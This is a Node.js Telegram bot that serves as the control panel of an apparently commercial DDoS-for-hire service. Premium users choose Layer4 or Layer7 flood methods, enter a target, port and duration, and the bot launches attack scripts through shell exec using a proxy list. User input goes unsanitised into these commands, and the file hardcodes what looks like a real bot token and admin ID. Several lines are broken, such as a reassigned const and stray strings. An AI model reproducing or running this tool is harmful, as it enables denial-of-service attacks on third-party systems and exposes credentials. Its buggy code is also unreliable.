const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const settings = require('./settings'); 
const premiumUsers = require('./database/premiumUsers.json');
const adminId = settings.adminId; // Mendapatkan nilai adminId dari setting.js
const token = settings.token;"6859880538:AAHCviDRt3Ma_gts5nvyTWnDckPSuX2_Qfo"

const bot = new TelegramBot(token, { polling: true });

// Load premium users from database
if (fs.existsSync(premiumUsers)) {
  const data = fs.readFileSync(premiumUsers);
  premiumUsers = JSON.parse(data);
}

// Function to save premium users to database
const savePremiumUsers = () => {
  fs.writeFileSync(premiumUsers, JSON.stringify(premiumUsers));
}

// Function to check if user is admin
const isAdmin = (userId) => {
  return userId.toString() === adminId;"5945548890"
}

// Function to add premium user
const addPremiumUser = (userId) => {
  premiumUsers.push(userId);
  savePremiumUsers();
}

// Function to remove premium user
const removePremiumUser = (userId) => {
  const index = premiumUsers.indexOf(userId);
  if (index > -1) {
    premiumUsers.splice(index, 1);
    savePremiumUsers();
  }
}
//fitur admin
// Command: /addprem iduser
bot.onText(/\/addprem (.+)/, (msg, match) => {
  const userId = match[1];
  if (isAdmin(msg.from.id)) {
    addPremiumUser(userId);
    bot.sendMessage(msg.chat.id, `User ${userId} has been added to premium users.`);
  } else {
    bot.sendMessage(msg.chat.id, 'Only admin can add premium users.');
  }
});

// Command: /delprem iduser
bot.onText(/\/delprem (.+)/, (msg, match) => {
  const userId = match[1];
  if (isAdmin(msg.from.id)) {
    removePremiumUser(userId);
    bot.sendMessage(msg.chat.id, `User ${userId} has been removed from premium users.`);
  } else {
    bot.sendMessage(msg.chat.id, 'Only admin can remove premium users.');
  }
});

bot.onText(/\/http (.+)/, (msg, match) => {
  const web = match[1];
  const url = `https://check-host.net/check-http?host=${web}&csrf_token=`;
  const button = createButton('Click disini', url);
  bot.sendMessage(msg.chat.id, 'Klik link di bawah untuk melihat hasil:', {
    reply_markup: {
      inline_keyboard: [
        [button]
      ]
    }
  });
});


bot.onText(/\/ddos/, (msg) => {
    const chatId = msg.chat.id;
    
    bot.sendMessage(chatId, 'Mau Layer Berapa Kak?', {
        reply_markup: {
            keyboard: [
                ['Layer4', 'Layer7']
            ],
            one_time_keyboard: true,
            resize_keyboard: true
        }
    });
});

bot.onText(/KEMBALI/, (msg) => {
    const chatId = msg.chat.id;
    
    bot.sendMessage(chatId, 'Mau Layer Berapa Kak?', {
        reply_markup: {
            keyboard: [
                ['Layer4', 'Layer7']
            ],
            one_time_keyboard: true,
            resize_keyboard: true
        }
    });
});

bot.onText(/Layer4/, (msg) => {
    const chatId = msg.chat.id;

    bot.sendMessage(chatId, 'Silahkan pilih method:', {
        reply_markup: {
            keyboard: [
                ['UDP', 'TCP'],
                ['SAMP', 'C-HTTP'],
                ['KEMBALI']
            ],
            one_time_keyboard: true,
            resize_keyboard: true
        }
    });
});
bot.onText(/Layer7/, (msg) => {
    const chatId = msg.chat.id;

    bot.sendMessage(chatId, 'Silahkan pilih method:', {
        reply_markup: {
            keyboard: [
                ['HTTPS', 'TLS'],
                ['BYPASS', 'UAM'],
                ['GHOST'],
                ['KEMBALI']
           ],
            one_time_keyboard: true,
            resize_keyboard: true
        }
    });
});


let selectedMethodBabak1 = '';
let targetBabak1 = '';
let timeBabak1 = '';
let isPremium = false;
let runningProcess = null;

// Cek apakah user adalah premium user
function checkPremiumUser(userId) {
    return premiumUsers.includes(userId.toString());
}

// Babak1
bot.onText(/HTTPS|TLS|BYPASS|UAM|GHOST/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const messageText = msg.text;

    if (!checkPremiumUser(userId)) {
        bot.sendMessage(chatId, 'Maaf, fitur ini hanya tersedia untuk pengguna premium. Silakan hubungi admin untuk informasi lebih lanjut.', {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'Hubungi Admin',
                        url: 'https://t.me/AnakManis1'
                    }]
                ]
            }
        });
        return;
    }

    if (selectedMethodBabak1 === '') {
        selectedMethodBabak1 = messageText;
        bot.sendMessage(chatId, 'Masukkan Target:');
    }
});

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const messageText = msg.text;
    
    if (selectedMethodBabak1 !== '' && targetBabak1 === '') {
        targetBabak1 = messageText;
        bot.sendMessage(chatId, 'Masukkan waktu:');
    } else if (selectedMethodBabak1 !== '' && targetBabak1 !== '' && timeBabak1 === '') {
        timeBabak1 = messageText;

        bot.sendMessage(chatId, `FITUR: ${selectedMethodBabak1}\nTARGET: ${targetBabak1}\nTIME: ${timeBabak1}\nDIJALANKAN`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'STOP',
                        callback_data: 'stop'
                    }]
                ]
            }
        });

        const methodFile = `${selectedMethodBabak1}.js`;
        const command = `node ${methodFile} ${targetBabak1} ${timeBabak1} 32 40 proxy.txt`;

        fs.access(methodFile, fs.F_OK, (err) => {
            if (err) {
                bot.sendMessage(chatId, `File ${selectedMethodBabak1}.js tidak ditemukan.`);
            } else {
                const exec = require('child_process').exec;
                runningProcess = exec(command, (error, stdout, stderr) => {
                    // Tangani output dari proses yang berjalan
                });

                // Tidak ada fitur "Output:" di sini
            }
        });

        // Reset variables Babak1
        selectedMethodBabak1 = '';
        targetBabak1 = '';
        timeBabak1 = '';
    }
});

bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    if (data === 'stop' && runningProcess !== null) {
        runningProcess.kill();
        bot.sendMessage(chatId, 'Proses telah dihentikan.');
    }
});
// Babak2

// Cek apakah user adalah premium user
function checkPremiumUser(userId) {
    return premiumUsers.includes(userId.toString());
}

let selectedMethodBabak2 = '';
let targetBabak2 = '';
let portBabak2 = '';
let timeBabak2 = '';

// Babak2
bot.onText(/UDP|TCP|SAMP|C-HTTP/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const messageText = msg.text;

    if (!checkPremiumUser(userId)) {
        bot.sendMessage(chatId, 'Maaf, fitur ini hanya tersedia untuk pengguna premium. Silakan hubungi admin untuk informasi lebih lanjut.', {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'Hubungi Admin',
                        url: 'https://t.me/AnakManis1'
                    }]
                ]
            }
        });
        return;
    }

    if (selectedMethodBabak2 === '') {
        selectedMethodBabak2 = messageText;
        bot.sendMessage(chatId, 'Masukkan Target:');
    }
});

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const messageText = msg.text;

    if (selectedMethodBabak2 !== '' && targetBabak2 === '') {
        targetBabak2 = messageText;
        bot.sendMessage(chatId, 'Masukkan Port:');
    } else if (selectedMethodBabak2 !== '' && targetBabak2 !== '' && portBabak2 === '') {
        portBabak2 = parseInt(messageText);
        bot.sendMessage(chatId, 'Masukkan Time:');
    } else if (selectedMethodBabak2 !== '' && targetBabak2 !== '' && portBabak2 !== '' && timeBabak2 === '') {
        timeBabak2 = parseInt(messageText);

        bot.sendMessage(chatId, `BERHASIL MENJALANKAN FILE DENGAN\nTarget: ${targetBabak2}\nPort: ${portBabak2}\nTime: ${timeBabak2}`);

        // Menjalankan file dengan Node.js Babak2
        const exec = require('child_process').exec;
        const command = `node ${selectedMethodBabak2}.js ${targetBabak2} ${portBabak2} ${timeBabak2}`;

        exec(command, (error, stdout, stderr) => {
            if (error) {
                console.error(`exec error: ${error}`);
            }
            console.log(stdout);
        });

        // Reset variables Babak2
        selectedMethodBabak2 = '';
        targetBabak2 = '';
        portBabak2 = '';
        timeBabak2 = '';
    }
});

// Fitur /stop untuk menghentikan file perlahan
bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!checkPremiumUser(userId)) {
        bot.sendMessage(chatId, 'Maaf, fitur ini hanya tersedia untuk pengguna premium.');
        return;
    }

    // Implementasi penghentian file secara perlahan di sini (CTRL + Z, CTRL + X, dll.)
    bot.sendMessage(chatId, 'File sedang dihentikan secara perlahan...');
});